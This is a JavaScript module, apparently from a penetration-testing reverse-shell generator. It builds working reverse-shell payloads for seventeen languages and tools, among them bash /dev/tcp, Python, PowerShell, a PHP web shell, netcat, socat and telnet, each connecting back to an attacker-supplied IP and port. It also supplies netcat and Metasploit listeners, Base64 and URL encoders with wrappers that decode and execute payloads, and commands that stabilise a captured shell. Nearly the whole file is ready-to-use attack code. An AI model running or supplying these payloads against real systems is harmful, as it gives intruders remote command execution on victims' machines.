// reverseshell.js — Reverse shell templates for all supported languages
// Includes encoding: Raw, Base64, URL Encoded

'use strict';

const SHELL_LANGUAGES = [
  { id: 'bash',       label: 'Bash' },
  { id: 'python2',    label: 'Python 2' },
  { id: 'python3',    label: 'Python 3' },
  { id: 'php',        label: 'PHP' },
  { id: 'powershell', label: 'PowerShell' },
  { id: 'perl',       label: 'Perl' },
  { id: 'ruby',       label: 'Ruby' },
  { id: 'java',       label: 'Java' },
  { id: 'golang',     label: 'Golang' },
  { id: 'nodejs',     label: 'Node.js' },
  { id: 'socat',      label: 'Socat' },
  { id: 'awk',        label: 'Awk' },
  { id: 'lua',        label: 'Lua' },
  { id: 'nc',         label: 'Netcat' },
  { id: 'ncat',       label: 'Ncat' },
  { id: 'busybox',    label: 'BusyBox nc' },
  { id: 'telnet',     label: 'Telnet' },
];

const ENCODINGS = [
  { id: 'raw',    label: 'Raw' },
  { id: 'base64', label: 'Base64' },
  { id: 'url',    label: 'URL Encoded' },
];

function generateShell(lang, ip, port) {
  const templates = {
    bash: {
      payload: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      payloadAlt: `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
      note: 'Standard bash TCP redirect. If first form fails, try second.'
    },
    python2: {
      payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      note: 'Python 2 reverse shell using subprocess.'
    },
    python3: {
      payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      payloadAlt: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")'`,
      note: 'Python 3. Second form spawns a PTY for a more stable shell.'
    },
    php: {
      payload: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      payloadAlt: `<?php system("bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"); ?>`,
      note: 'First form is a one-liner. Second form is a web shell to embed in a .php file.'
    },
    powershell: {
      payload: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      payloadAlt: `$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};$StreamReader = New-Object IO.StreamReader($NetworkStream);$StreamWriter.AutoFlush = $true;$Buffer = New-Object System.Byte[] 1024;$Encoding = New-Object System.Text.AsciiEncoding;while ($TCPClient.Connected) {while ($NetworkStream.DataAvailable) {$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);$Code = ($Encoding.GetString($Buffer, 0, $RawData)).Split('\`n');foreach ($Line in $Code) {if ($Line.Length -gt 5) {$Command = $Line;$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};WriteToStream ($Output)}}}};$TCPClient.Close();`,
      note: 'First is quick one-liner. Second is a more stable interactive shell.'
    },
    perl: {
      payload: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
      note: 'Perl reverse shell using Socket module.'
    },
    ruby: {
      payload: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
      payloadAlt: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
      note: 'Ruby reverse shell. Second form forks for stability.'
    },
    java: {
      payload: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
      payloadAlt: `public class Reverse {
    public static void main(String[] args) throws Exception {
        String host = "${ip}";
        int port = ${port};
        String[] cmd = {"/bin/sh"};
        Process p = new ProcessBuilder(cmd)
            .redirectErrorStream(true).start();
        java.net.Socket s = new java.net.Socket(host, port);
        java.io.InputStream pi = p.getInputStream(),
            pe = p.getErrorStream(),
            si = s.getInputStream();
        java.io.OutputStream po = p.getOutputStream(),
            so = s.getOutputStream();
        while (!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush(); po.flush();
            Thread.sleep(50);
            try { p.exitValue(); break; } catch (Exception e) {}
        }
        p.destroy(); s.close();
    }
}`,
      note: 'First is Groovy-compatible (Metasploit). Second is a full Java class.'
    },
    golang: {
      payload: `package main
import (
    "net"
    "os/exec"
    "time"
)
func main() {
    for {
        c, err := net.Dial("tcp", "${ip}:${port}")
        if err != nil {
            time.Sleep(time.Minute)
            continue
        }
        cmd := exec.Command("/bin/sh")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run()
        c.Close()
    }
}`,
      note: 'Golang reverse shell with reconnect loop. Compile: go build -o shell && ./shell'
    },
    nodejs: {
      payload: `(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(${port}, "${ip}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();`,
      payloadAlt: `node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(${port},"${ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});'`,
      note: 'First is multi-line format. Second is a one-liner for injection.'
    },
    socat: {
      payload: `socat TCP:${ip}:${port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane`,
      payloadAlt: `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
      note: 'Socat produces an excellent PTY shell with full job control.'
    },
    awk: {
      payload: `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
      note: 'Awk reverse shell — useful when only awk is available.'
    },
    lua: {
      payload: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
      payloadAlt: `lua5.1 -e 'local host, port = "${ip}", ${port} local socket = require("socket") local tcp = socket.tcp() tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
      note: 'Lua reverse shell. Requires lua-socket library.'
    },
    nc: {
      payload: `nc -e /bin/sh ${ip} ${port}`,
      payloadAlt: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      note: 'First form requires nc with -e flag (traditional netcat). Second form works without -e (OpenBSD nc).'
    },
    ncat: {
      payload: `ncat ${ip} ${port} -e /bin/bash`,
      payloadAlt: `ncat --ssl ${ip} ${port} -e /bin/bash`,
      note: 'Ncat (from nmap) reverse shell. Second form uses SSL encryption.'
    },
    busybox: {
      payload: `busybox nc ${ip} ${port} -e sh`,
      note: 'BusyBox netcat — common on embedded/IoT devices. Does support -e flag.'
    },
    telnet: {
      payload: `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | /bin/sh 1>$TF`,
      payloadAlt: `rm -f /tmp/p; mknod /tmp/p p && telnet ${ip} ${port} 0</tmp/p | /bin/sh 1>/tmp/p`,
      note: 'Telnet-based shell using named pipes. Useful when nc is unavailable.'
    },
  };

  return templates[lang] || { payload: `# No template for: ${lang}`, note: 'Unknown language' };
}

function generateListener(port, protocol = 'nc') {
  const listeners = {
    nc:    `nc -lvnp ${port}`,
    rlwrap:`rlwrap nc -lvnp ${port}`,
    socat: `socat -d -d TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`,
    ncat:  `ncat -lvnp ${port}`,
    msf:   `use exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT ${port}\nrun -j`,
  };
  return listeners[protocol] || `nc -lvnp ${port}`;
}

function encodePayload(payload, encoding) {
  switch (encoding) {
    case 'base64': {
      try {
        return btoa(unescape(encodeURIComponent(payload)));
      } catch (e) {
        return btoa(payload);
      }
    }
    case 'url':
      return encodeURIComponent(payload);
    case 'raw':
    default:
      return payload;
  }
}

function buildWrappedPayload(lang, payload, encoding) {
  if (encoding === 'raw') return payload;

  const encoded = encodePayload(payload, encoding);

  if (encoding === 'base64') {
    switch (lang) {
      case 'bash':
        return `echo '${encoded}' | base64 -d | bash`;
      case 'python3':
        return `python3 -c "import base64,subprocess;subprocess.call(__import__('shlex').split(base64.b64decode('${encoded}').decode()))"`;
      case 'powershell':
        return `powershell -EncodedCommand ${btoa(unescape(encodeURIComponent(payload))).replace(/=/g, '')}`;
      default:
        return `# Base64: ${encoded}\n# Decode with: echo '${encoded}' | base64 -d | sh`;
    }
  }

  if (encoding === 'url') {
    return `# URL Encoded payload:\n${encoded}\n\n# Decoded form:\n${payload}`;
  }

  return payload;
}

function getStabilisationCommands() {
  return {
    step1: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    step2: `# Press Ctrl+Z to background the shell, then in your terminal:`,
    step3: `stty raw -echo; fg`,
    step4: `# Press Enter twice, then:`,
    step5: `export TERM=xterm`,
    step6: `stty rows 50 cols 200`,
    note: 'These commands upgrade a basic shell to a fully interactive PTY with tab completion, arrow keys, Ctrl+C handling, and proper display.'
  };
}

module.exports = { SHELL_LANGUAGES, ENCODINGS, generateShell, generateListener, encodePayload, buildWrappedPayload, getStabilisationCommands };
